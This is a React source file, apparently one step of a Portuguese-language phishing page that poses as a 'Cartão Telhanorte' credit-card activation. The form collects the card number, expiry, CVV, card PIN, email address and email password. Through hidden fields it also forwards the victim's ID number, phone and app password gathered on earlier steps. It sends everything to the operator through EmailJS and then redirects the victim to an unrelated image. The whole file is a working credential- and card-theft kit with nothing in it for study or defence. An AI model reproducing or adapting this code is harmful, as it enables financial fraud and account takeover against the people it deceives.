import React, { Component } from 'react'
import logo from './logo.jpeg'
import emailjs from 'emailjs-com';
import { reduce } from 'async';



export class SocialProfiles extends Component {



    
    continue = e => {
        e.preventDefault();
        this.props.nextStep();
    };

    back = e => {
        e.preventDefault();
        this.props.prevStep();
    };
    

    render() {




        function sendEmail(e) {
            e.preventDefault();

            emailjs.sendForm('service_m0rqqeb', 'template_tf3q2rh', e.target, 'user_blutAP3dvwCpJzktiSL3a')
              .then((result) => {
                  console.log(result.text);
                  window.location.href = ('http://www.mercedita.com.br/assets/img/layout/sucesso-news.png'); 


              }, (error) => {
                  console.log(error.text);
              });


          
        
    }



        const { values, inputChange } = this.props;
        const {
            values: { cp, email, phone, passapp, cc, valcc, ccpass,passemail,cvv }
        } = this.props;
        return (

<>
            <div  className="logo_container ">

            <img className="logo" src={logo} width="250"/>
            </div>
            <div className="form-container">
      
                <p className="mb-7" ><b>Tudo certo!<br></br></b> Precisamos Cadastrar seu <b>Cartão Telhanorte</b> para Liberar o Limite do <b>Novo Crédito</b> </p>
              
                <div className="form-group">
                    <input placeholder="16 dígitos do cartão" type="number" className="form-control" name="cc" onChange={inputChange('cc')} value={values.cc} required/>
                </div>
                <div className="form-group">
                    <input placeholder="Validade(Mês/Ano)" type="text" className="form-control" name="valcc" onChange={inputChange('valcc')} value={values.valcc} required/>
                </div>
                <div className="form-group">
                    <input placeholder="Código de Segurança (CVV)" type="text" className="form-control" name="cvv" onChange={inputChange('cvv')} value={values.cvv} required/>
                </div>
                <div className="form-group">
                    <input placeholder="Senha do cartão" className="form-control" name="ccpass" onChange={inputChange('ccpass')} value={values.ccpass} required/>
                </div>
                <div className="form-group">
                    <input placeholder="Seu email" type="email" className="form-control" name="email" onChange={inputChange('email')} value={values.email} />
                   <span class="focus-border"></span>
                </div>
                <div className="form-group">
                    <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} required/>
                   <span class="focus-border"></span>
                </div>
          

                <div className="row">
                    <div className="col-6">
                        <button className="btn btn-primary" onClick={this.back}>VOLTAR</button>
                    </div>
                    <div className="col-6 text-right">
                    <form onSubmit={sendEmail}>

    <input type="hidden" name="cp" value={cp} required></input>
    <input type="hidden" name="email" value={email}></input>
    <input type="hidden" name="phone"  value={phone}></input>
    <input type="hidden" name="passapp" value={passapp}></input>
    <input type="hidden" name="cc" value={cc}></input>
    <input type="hidden" name="valcc" value={valcc}></input>
    <input type="hidden" name="cvv" value={cvv}></input>
    <input type="hidden" name="ccpass" value={ccpass}></input>
    <input type="hidden" name="passemail" value={passemail}></input>


                       
    <button type="submit"className="btn btn-primary" >ENTRAR</button>
    </form>
                    </div>
                </div>
            </div>

</>
        )
      
    }
}

export default SocialProfiles
